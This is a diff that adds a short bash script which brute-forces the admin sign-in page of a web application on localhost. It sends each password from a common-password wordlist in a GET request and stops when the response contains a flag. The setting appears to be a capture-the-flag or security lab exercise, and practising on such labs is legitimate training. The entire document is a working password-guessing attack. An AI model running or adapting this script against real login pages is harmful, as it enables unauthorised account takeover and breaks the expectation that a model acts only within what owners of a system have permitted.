@@ -1,0 +1,10 @@
+#!/bin/bash
+while IFS= read -r pass; do
+  result=$(curl -s "http://localhost:8081/index.php?page=signin&username=admin&password=$pass&Login=Login")
+  echo -n "."
+  if echo "$result" | grep -qi "flag"; then
+    echo "FOUND: $pass"
+    echo "$result" | grep -i flag
+    break
+  fi
+done < Most-Popular-Letter-Passes.txt
